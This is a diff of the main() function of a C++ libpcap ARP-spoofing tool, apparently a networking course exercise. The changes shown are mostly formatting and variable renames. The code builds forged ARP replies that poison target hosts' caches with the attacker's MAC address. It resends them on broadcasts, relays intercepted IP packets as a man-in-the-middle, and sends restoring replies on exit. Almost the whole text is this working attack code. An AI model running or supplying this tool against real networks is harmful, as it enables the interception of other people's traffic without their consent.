@@ -2,7 +2,8 @@
 
 int main(int argc, char* argv[])
 {
-    if( argc < 4 || (argc % 2) ) {
+    if( argc < 4 || (argc % 2) )
+    {
         usage();
         return -1;
     }
@@ -15,7 +16,8 @@ int main(int argc, char* argv[])
     char* dev = argv[1];
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t* handle = pcap_open_live(dev, BUFSIZ, 0, 1000, errbuf);
-    if (handle == nullptr) {
+    if (handle == nullptr)
+    {
         fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
         return -1;
     }
@@ -40,55 +42,50 @@ int main(int argc, char* argv[])
         memcpy(address_table[i].tgt_mac, target_mac, MAC_SIZE);
         address_table[i].tgt_ip = inet_addr(argv[2*(i+1)+1]);
     }
-    printf("sesson size: %d\n", session_size);
-
 
     /////////////////////////////////////////////////////////////////////////////
     /// Make all infection packets and restored packets
     /////////////////////////////////////////////////////////////////////////////
 
-    arp_packet* infected_arp_lists = (arp_packet*)calloc(session_size, sizeof(arp_packet));
-    arp_packet* restored_arp_lists = (arp_packet*)calloc(session_size, sizeof(arp_packet));
+    arp_packet* infected_arp_list = (arp_packet*)calloc(session_size, sizeof(arp_packet));
+    arp_packet* restored_arp_list = (arp_packet*)calloc(session_size, sizeof(arp_packet));
 
-    uint8_t my_mac[MAC_SIZE] = {0, };
-    GetSvrMACAddress(my_mac);
-
-    uint32_t my_ip = 0;
-    GetSvrIPAddress(&my_ip);
+    uint8_t my_mac[MAC_SIZE] = {0, };   GetSvrMACAddress(my_mac);
+    uint32_t my_ip = 0;                 GetSvrIPAddress(&my_ip);
 
     for(int i = 0; i < session_size; i++)
     {
         {
-            memcpy(infected_arp_lists[i].e.ether_dhost, address_table[i].sdr_mac, MAC_SIZE);
-            memcpy(infected_arp_lists[i].e.ether_shost, my_mac, MAC_SIZE);
-            infected_arp_lists[i].e.ether_type = htons(ETHERTYPE_ARP);
+            memcpy(infected_arp_list[i].e.ether_dhost, address_table[i].sdr_mac, MAC_SIZE);
+            memcpy(infected_arp_list[i].e.ether_shost, my_mac, MAC_SIZE);
+            infected_arp_list[i].e.ether_type = htons(ETHERTYPE_ARP);
 
-            infected_arp_lists[i].a.ar_hrd = htons(ARPHRD_ETHER);
-            infected_arp_lists[i].a.ar_pro = htons(ETHERTYPE_IP);
-            infected_arp_lists[i].a.ar_hln = MAC_SIZE;
-            infected_arp_lists[i].a.ar_pln = IP_SIZE;
-            infected_arp_lists[i].a.ar_op  = htons(ARPOP_REPLY);
+            infected_arp_list[i].a.ar_hrd = htons(ARPHRD_ETHER);
+            infected_arp_list[i].a.ar_pro = htons(ETHERTYPE_IP);
+            infected_arp_list[i].a.ar_hln = MAC_SIZE;
+            infected_arp_list[i].a.ar_pln = IP_SIZE;
+            infected_arp_list[i].a.ar_op  = htons(ARPOP_REPLY);
 
-            memcpy(infected_arp_lists[i].p.sdr_mac, my_mac, MAC_SIZE);
-            infected_arp_lists[i].p.sdr_ip = inet_addr(argv[2*(i+1)+1]);
-            memcpy(infected_arp_lists[i].p.tgt_mac, address_table[i].sdr_mac, MAC_SIZE);
-            infected_arp_lists[i].p.tgt_ip = inet_addr(argv[2*(i+1)]);
+            memcpy(infected_arp_list[i].p.sdr_mac, my_mac, MAC_SIZE);
+            infected_arp_list[i].p.sdr_ip = inet_addr(argv[2*(i+1)+1]);
+            memcpy(infected_arp_list[i].p.tgt_mac, address_table[i].sdr_mac, MAC_SIZE);
+            infected_arp_list[i].p.tgt_ip = inet_addr(argv[2*(i+1)]);
         }
         {
-            memcpy(restored_arp_lists[i].e.ether_dhost, address_table[i].sdr_mac, MAC_SIZE);
-            memcpy(restored_arp_lists[i].e.ether_shost, address_table[i].tgt_mac, MAC_SIZE);
-            restored_arp_lists[i].e.ether_type = htons(ETHERTYPE_ARP);
+            memcpy(restored_arp_list[i].e.ether_dhost, address_table[i].sdr_mac, MAC_SIZE);
+            memcpy(restored_arp_list[i].e.ether_shost, address_table[i].tgt_mac, MAC_SIZE);
+            restored_arp_list[i].e.ether_type = htons(ETHERTYPE_ARP);
 
-            restored_arp_lists[i].a.ar_hrd = htons(ARPHRD_ETHER);
-            restored_arp_lists[i].a.ar_pro = htons(ETHERTYPE_IP);
-            restored_arp_lists[i].a.ar_hln = MAC_SIZE;
-            restored_arp_lists[i].a.ar_pln = IP_SIZE;
-            restored_arp_lists[i].a.ar_op  = htons(ARPOP_REPLY);
+            restored_arp_list[i].a.ar_hrd = htons(ARPHRD_ETHER);
+            restored_arp_list[i].a.ar_pro = htons(ETHERTYPE_IP);
+            restored_arp_list[i].a.ar_hln = MAC_SIZE;
+            restored_arp_list[i].a.ar_pln = IP_SIZE;
+            restored_arp_list[i].a.ar_op  = htons(ARPOP_REPLY);
 
-            memcpy(restored_arp_lists[i].p.sdr_mac, address_table[i].tgt_mac, MAC_SIZE);
-            restored_arp_lists[i].p.sdr_ip = inet_addr(argv[2*(i+1)+1]);
-            memcpy(restored_arp_lists[i].p.tgt_mac, address_table[i].sdr_mac, MAC_SIZE);
-            restored_arp_lists[i].p.tgt_ip = inet_addr(argv[2*(i+1)]);
+            memcpy(restored_arp_list[i].p.sdr_mac, address_table[i].tgt_mac, MAC_SIZE);
+            restored_arp_list[i].p.sdr_ip = inet_addr(argv[2*(i+1)+1]);
+            memcpy(restored_arp_list[i].p.tgt_mac, address_table[i].sdr_mac, MAC_SIZE);
+            restored_arp_list[i].p.tgt_ip = inet_addr(argv[2*(i+1)]);
         }
     }
 
@@ -97,19 +94,24 @@ int main(int argc, char* argv[])
     /// Print all table members
     /////////////////////////////////////////////////////////////////////////////
 
-    for(int i = 0; i < session_size; i++) {
+    printf("Session size: %d\n\n", session_size);
+
+    for(int i = 0; i < session_size; i++)
+    {
         printf("%dth address table\n", i+1);
         Print((const uint8_t*)&address_table[i], sizeof(addr_pair));
     }
 
-    for(int i = 0; i < session_size; i++) {
+    for(int i = 0; i < session_size; i++)
+    {
         printf("%dth infected arp packet\n", i + 1);
-        Print((const uint8_t*)&infected_arp_lists[i], sizeof(arp_packet));
+        Print((const uint8_t*)&infected_arp_list[i], sizeof(arp_packet));
     }
 
-    for(int i = 0; i < session_size; i++) {
+    for(int i = 0; i < session_size; i++)
+    {
         printf("%dth restored arp packet\n", i + 1);
-        Print((const uint8_t*)&restored_arp_lists[i], sizeof(arp_packet));
+        Print((const uint8_t*)&restored_arp_list[i], sizeof(arp_packet));
     }
 
 
@@ -121,12 +123,13 @@ int main(int argc, char* argv[])
     {
         for(int i = 0; i < session_size; i++)
         {
-            if( pcap_sendpacket(handle, (const uint8_t*)&infected_arp_lists[i], sizeof(arp_packet)) ) {
+            if( pcap_sendpacket(handle, (const uint8_t*)&infected_arp_list[i], sizeof(arp_packet)) )
+            {
                 printf("infected arp packet sending failed\n");
                 return -1;
             }
         }
-        sleep(1);
+        sleep(1);   // make some terms before send packets
     }
 
 
@@ -134,15 +137,14 @@ int main(int argc, char* argv[])
     /// Relay packets
     /////////////////////////////////////////////////////////////////////////////
 
-
-    sigset_t sigset;
-    sigset_t pendingset;
+    sigset_t sigset, pendingset;
 
     sigfillset(&sigset);
-    sigprocmask(SIG_BLOCK, &sigset, NULL);
+    sigprocmask(SIG_BLOCK, &sigset, nullptr);
 
-    while(true)   // loop until something get in
+    while(true)
     {
+        // loop until sigint interrupt(ctrl+c) occured
         if (sigpending(&pendingset) == 0 && sigismember(&pendingset, SIGINT)) break;
 
         struct pcap_pkthdr* header;
@@ -151,19 +153,21 @@ int main(int argc, char* argv[])
         if (res == 0) continue;
         if (res == -1 || res == -2) break;
 
-        if( is_broadcasting_packet(packet) ) {
+        if( is_broadcasting_packet(packet) )
+        {
             printf("broadcasting packet captured\n");
 
             for(int i = 0; i < session_size; i++)
             {
-                if( pcap_sendpacket(handle, (const uint8_t*)&infected_arp_lists[i], sizeof(arp_packet)) ) {
+                if( pcap_sendpacket(handle, (const uint8_t*)&infected_arp_list[i], sizeof(arp_packet)) )
+                {
                     printf("infected arp packet sending failed\n");
                     return -1;
                 }
             }
-            // send_infection_packet(handle, packet, infected_arp_lists, address_table, session_size);
         }
-        else if( is_ip_packet(packet) ) {
+        else if( is_ip_packet(packet) )
+        {
             printf("ip packet captured\n");
             send_relay_packet(handle, packet, address_table, session_size, header->caplen);
         }
@@ -178,12 +182,12 @@ int main(int argc, char* argv[])
     {
         for(int i = 0; i < session_size; i++)
         {
-            if( pcap_sendpacket(handle, (const uint8_t*)&restored_arp_lists[i], sizeof(arp_packet)) ) {
+            if( pcap_sendpacket(handle, (const uint8_t*)&restored_arp_list[i], sizeof(arp_packet)) ) {
                 printf("restored arp packet sending failed\n");
                 return -1;
             }
         }
-        sleep(1);
+        sleep(1);   // make some terms before send packets
     }
 
     /////////////////////////////////////////////////////////////////////////////
@@ -191,7 +195,7 @@ int main(int argc, char* argv[])
     /////////////////////////////////////////////////////////////////////////////
 
     free(address_table);
-    free(infected_arp_lists);
-    free(restored_arp_lists);
+    free(infected_arp_list);
+    free(restored_arp_list);
     return 0;
 }
